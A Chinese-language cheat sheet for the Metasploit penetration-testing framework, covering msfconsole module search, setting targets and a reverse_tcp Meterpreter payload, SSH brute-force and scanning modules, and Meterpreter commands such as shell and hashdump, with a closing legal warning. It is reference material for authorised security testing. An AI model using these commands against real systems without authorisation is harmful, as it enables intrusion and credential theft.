# Metasploit Framework - 渗透测试框架

## 概述
| 属性 | 值 |
|------|-----|
| 二进制 | `msfconsole` |
| 类别 | 漏洞利用、后渗透 |
| 风险等级 | 高 |

## 描述
Metasploit Framework 是最流行的渗透测试框架，提供漏洞利用、Payload 生成、后渗透模块等功能。

---

## 基础命令

### 1. 启动控制台
```bash
msfconsole
```

### 2. 搜索模块
```bash
search type:exploit name:apache
search cve:2021-44228
search platform:linux type:exploit
```

### 3. 使用模块
```bash
use exploit/multi/handler
use auxiliary/scanner/ssh/ssh_login
```

### 4. 查看选项
```bash
show options
show payloads
show targets
```

### 5. 设置参数
```bash
set RHOSTS 192.168.1.1
set RPORT 445
set LHOST 192.168.1.100
set PAYLOAD linux/x64/meterpreter/reverse_tcp
```

### 6. 执行
```bash
exploit
run
```

---

## 常用模块类型
| 类型 | 说明 |
|------|------|
| `exploit` | 漏洞利用 |
| `auxiliary` | 辅助模块（扫描、嗅探等） |
| `payload` | 攻击载荷 |
| `post` | 后渗透模块 |
| `encoder` | 编码器 |

---

## 常用辅助模块
```bash
# SSH 暴力破解
use auxiliary/scanner/ssh/ssh_login

# SMB 扫描
use auxiliary/scanner/smb/smb_version

# 端口扫描
use auxiliary/scanner/portscan/tcp
```

---

## Meterpreter 常用命令
```bash
sysinfo          # 系统信息
getuid           # 当前用户
ps               # 进程列表
shell            # 系统 shell
upload/download  # 文件传输
hashdump         # 导出哈希
```

---

## 安全提示
| 风险 | 说明 |
|------|------|
| **高危** | 可执行任意代码 |
| **法律** | 未授权使用违法 |
| **检测** | 易被 IDS/EDR 检测 |

> **警告**：仅在获得书面授权的目标上使用
